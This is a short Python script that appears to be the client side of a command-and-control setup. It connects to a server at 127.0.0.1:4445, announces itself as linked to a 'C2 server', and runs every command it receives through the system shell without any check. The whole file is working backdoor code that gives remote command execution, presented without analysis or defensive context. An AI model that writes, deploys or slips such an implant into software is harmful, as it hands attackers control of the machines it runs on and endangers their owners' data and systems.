import os
import socket
import threading
import subprocess
HOST = "127.0.0.1"
COMMANDS_PORT = 4445


def handle_server_communication(server_socket_command: socket.socket):
    try:
        while True:
            data = server_socket_command.recv(1024)

            if not data:
                print("Server closed the connection.")
                break

            command = data.decode('utf-8').strip()
            print(f"Received command: {command}")

            # Execute the command
            process = subprocess.run(command, shell=True)

    except Exception as e:
        print("Exception while handling the server communication for commands: " + str(e))

def main():
    server_socket_command = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket_command.connect((HOST, COMMANDS_PORT))
        print(f"Connected to C2 server at {HOST}:{COMMANDS_PORT}")
        
        threading.Thread(target=handle_server_communication, args=(server_socket_command,)).start()
        
    except Exception as e:
        print(f"Failed to connect to C2 server: {str(e)}")
        server_socket_command.close()

if __name__ == "__main__":
    main()